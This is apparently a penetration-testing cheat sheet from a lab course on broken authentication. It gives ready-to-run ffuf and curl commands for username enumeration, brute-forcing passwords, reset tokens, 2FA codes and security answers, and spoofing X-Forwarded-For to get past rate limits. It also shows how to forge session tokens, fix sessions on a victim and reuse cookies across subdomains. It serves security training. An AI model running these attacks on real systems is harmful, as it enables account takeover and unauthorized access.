# Broken Authentication

## User Enumeration

### Identify
- Different error messages for valid vs invalid usernames
- "Unknown user" vs "Invalid password"
- Response timing differences
- Password reset returns different messages for valid/invalid users

### Exploit - ffuf User Enumeration (Login Form)

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=FUZZ&password=invalid" \
     -fr "Unknown user"
```

### Exploit - ffuf User Enumeration (Password Reset)

Password reset endpoints often reveal valid usernames with different error messages.

```bash
# Generic password reset enumeration
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
     -u http://TARGET/reset-password \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=FUZZ" \
     -fr "user not found"

# CMS-specific (Backdrop/Drupal style)
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
     -u "http://TARGET/?q=user/password" \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "name=FUZZ&form_build_id=form-xxx&form_id=user_pass&op=Reset+password" \
     -fr "is not recognized as a user name or an email address"
```

**Tip:** Try both login and password reset endpoints - they may have different rate limiting or lockout policies.

---

## Password Brute Force

### Filter Wordlist by Password Policy

```bash
# grep method - filter for: uppercase, lowercase, digit, min 10 chars
grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

# awk method - same filter
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' rockyou.txt > custom_wordlist.txt
```

### Exploit - ffuf Password Brute Force

```bash
ffuf -w ./custom_wordlist.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=FUZZ" \
     -fr "Invalid username"
```

---

## Password Reset Token Brute Force

### Identify
- Short numeric token (4-6 digits)
- Token in URL: `?token=7351`
- No rate limiting

### Generate Token Wordlist

```bash
# 4-digit tokens (0000-9999)
seq -w 0 9999 > tokens.txt

# 6-digit tokens
seq -w 0 999999 > tokens.txt
```

### Exploit - ffuf Reset Token Brute Force

```bash
ffuf -w ./tokens.txt \
     -u "http://TARGET/reset_password.php?token=FUZZ" \
     -fr "The provided token is invalid"
```

---

## 2FA Bypass

### Identify
- Short OTP (4-6 digits)
- No lockout after failed attempts
- No rate limiting

### Exploit - ffuf 2FA Brute Force

```bash
# Generate OTP wordlist
seq -w 0 9999 > tokens.txt

# Brute force (include session cookie!)
ffuf -w ./tokens.txt \
     -u http://TARGET/2fa.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "PHPSESSID=YOUR_SESSION_COOKIE" \
     -d "otp=FUZZ" \
     -fr "Invalid 2FA Code"
```

---

## Rate Limit Bypass

### Identify
- Rate limit uses `X-Forwarded-For` header
- CVE-2020-35590 pattern

### Exploit - Randomize X-Forwarded-For

```bash
# Add random IP to each request
ffuf -w passwords.txt \
     -u http://TARGET/login \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "X-Forwarded-For: FUZZ2" \
     -d "username=admin&password=FUZZ" \
     -w <(for i in $(seq 1 10000); do echo "10.0.0.$((RANDOM % 255))"; done):FUZZ2
```

---

## Security Question Brute Force

### Identify
- Predictable questions: "What city were you born in?"
- No rate limiting on answers

### Create City Wordlist

```bash
# From world-cities.csv
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

# Filter by country (Germany)
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

### Exploit - ffuf Security Question Brute Force

```bash
ffuf -w ./city_wordlist.txt \
     -u http://TARGET/security_question.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "PHPSESSID=YOUR_SESSION_COOKIE" \
     -d "security_response=FUZZ" \
     -fr "Incorrect response"
```

---

## Password Reset Manipulation

### Identify
- Hidden `username` parameter in reset form
- Username passed through all reset steps

### Exploit - Change Username in Final Request

```http
POST /reset_password.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=xxx

password=NewP@ss123&username=admin
```

Answer YOUR security question → change `username` to victim in final step.

---

## Authentication Bypass - Direct Access

### Identify
- Protected page returns 302 redirect but body contains content
- Missing `exit;` after redirect

### Exploit - Burp Response Modification

1. Intercept → Do intercept → Response to this request
2. Change `302 Found` to `200 OK`
3. Forward response → page renders

### Exploit - curl

```bash
# View response body despite redirect
curl -i http://TARGET/admin.php
```

---

## Authentication Bypass - Parameter Modification

### Identify
- `user_id` parameter in URL after login
- Removing parameter causes redirect
- Sequential/guessable IDs

### Exploit

```bash
# Access as different user
curl "http://TARGET/admin.php?user_id=1"

# Brute force user IDs
ffuf -w <(seq 1 1000) \
     -u "http://TARGET/admin.php?user_id=FUZZ" \
     -fr "Could not load"
```

---

## Session Token Attacks

### Identify Weak Tokens
- Short length (< 16 chars)
- Sequential/incrementing
- Static portions with small random part
- Base64/hex encoded data

### Decode Session Tokens

```bash
# Base64
echo -n 'dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy' | base64 -d
# user=htb-stdnt;role=user

# Hex
echo -n '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -r -p
# user=htb-stdnt;role=user
```

### Forge Admin Token

```bash
# Base64
echo -n 'user=htb-stdnt;role=admin' | base64
# dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==

# Hex  
echo -n 'user=htb-stdnt;role=admin' | xxd -p
# 757365723d6874622d7374646e743b726f6c653d61646d696e
```

---

## Session Fixation

### Identify
- Session token set via URL parameter (`?sid=xxx`)
- Session not regenerated after login

### Exploit

1. Get valid session: `a1b2c3d4e5f6`
2. Send victim: `http://TARGET/?sid=a1b2c3d4e5f6`
3. Victim logs in with your session
4. Use `session=a1b2c3d4e5f6` to hijack

---

## Default Credentials

### Resources
- https://www.cirt.net/passwords
- https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
- https://github.com/scadastrangelove/SCADAPASS

### Common Defaults

| App | Username | Password |
|-----|----------|----------|
| WordPress | admin | admin |
| BookStack | admin@admin.com | password |
| Tomcat | tomcat | tomcat |
| Jenkins | admin | admin |
| phpMyAdmin | root | (empty) |

### Search

```bash
# Google dork
site:github.com "default credentials" <app_name>
```

---

## Cookie/Session Reuse Across Subdomains

### Identify

Sometimes session cookies from one subdomain work on another subdomain of the same application, even if login on the second subdomain fails.

### Scenario

- You login to `intra.target.htb` with user credentials
- You discover `admin.target.htb` subdomain
- Direct login to `admin.target.htb` fails ("not enough permissions")
- But the session cookie from `intra.target.htb` works on `admin.target.htb`

### Exploit

1. Login to the accessible subdomain:
   ```
   POST /login HTTP/1.1
   Host: intra.target.htb
   
   username=user&password=pass
   ```

2. Note the session cookies set:
   ```
   Set-Cookie: PHPSESSID=abc123; LANG=EN_US; DOMAIN=intra
   ```

3. Copy cookies to browser for the admin subdomain:
   - Open `admin.target.htb` in browser
   - Open Developer Tools → Application → Cookies
   - Add/modify cookies from the working session:
     - `PHPSESSID=abc123`
     - Change `DOMAIN` cookie from `intra` to `admin`

4. Refresh the page - you may now have access to the admin panel with the same user's elevated privileges.

### Why This Works

- Session is stored server-side and tied to PHPSESSID, not to the subdomain
- Role/permission checks may only happen at login, not on every request
- Cookies with `domain=.target.htb` are shared across all subdomains

### Tool-Assisted

```bash
# Use curl to test cookie reuse
curl -k "https://admin.target.htb/" \
  -b "PHPSESSID=abc123; LANG=EN_US; DOMAIN=admin"
```
